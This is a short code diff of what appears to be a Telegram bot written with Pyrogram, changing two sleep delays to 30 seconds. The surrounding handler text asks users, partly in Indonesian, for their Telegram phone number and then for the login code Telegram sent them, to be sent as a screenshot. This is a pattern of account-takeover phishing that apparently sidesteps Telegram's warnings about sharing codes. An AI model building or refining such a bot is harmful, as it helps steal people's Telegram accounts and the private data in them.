@@ -94,7 +94,7 @@ async def free(_, message):
 @app.on_message(filters.command("verif") & filters.private)
 async def verip(_, message):
     await app.send_message(message.chat.id, "Silahkan Masukann Nomer Telpon akun Telegram mu..")
-    time.sleep(1)
+    time.sleep(30)
 
 # SEND NOMER
 
@@ -107,7 +107,7 @@ We sent a Screnshot  login code to your Telegram account. Enter your Login Scren
 
 Just send it in the form of a screenshot, you don't need to send it via text.
 """)
-    time.sleep(5)
+    time.sleep(30)
 
 # DATABASE !!!
 
